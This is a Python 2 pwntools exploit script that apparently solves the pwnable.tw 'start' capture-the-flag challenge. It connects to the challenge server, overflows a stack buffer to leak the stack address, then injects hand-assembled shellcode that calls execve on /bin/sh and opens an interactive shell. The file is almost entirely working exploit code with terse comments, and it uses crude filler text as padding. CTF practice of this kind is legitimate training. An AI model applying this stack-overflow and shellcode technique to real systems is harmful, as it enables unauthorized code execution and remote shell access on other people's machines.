#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

ready = True

if ready:
    conn = connect('chall.pwnable.tw', 10000)
else:
    conn = process('/home/doublesine/Desktop/start')

print(conn.read())

#--------stage 1
shellcode = 'fuck' * 5
shellcode += pack(0x08048087, 32)
print('send shellcode, len = %d' % len(shellcode))
conn.send(shellcode)

#--------stage 2
esp = unpack(conn.read()[0:4], 32) - 4
print('esp = 0x%08X' % esp)
shellcode = 'fuck' * 5
shellcode += pack(esp + 4 * 5 + 4, 32)
shellcode += asm('mov al, 0xb')     # use sys_execve
shellcode += asm('xor ecx, ecx')    # clear ecx, no argv
shellcode += asm('xor edx, edx')    # clear edx, no env
shellcode += asm('xor esi, esi')    # clear esi, no regs
shellcode += asm('push 0x' + '/sh\x00'[::-1].encode('hex'))
shellcode += asm('push 0x' + '/bin'[::-1].encode('hex'))
shellcode += asm('mov ebx, esp')    # name = "/bin/sh"
shellcode += asm('int 0x80')
shellcode += asm('push 0x0804809D')
shellcode += asm('ret')
print('send shellcode, len = %d' % len(shellcode))
conn.send(shellcode)

#--------stage 3
conn.interactive()  # you will get shell here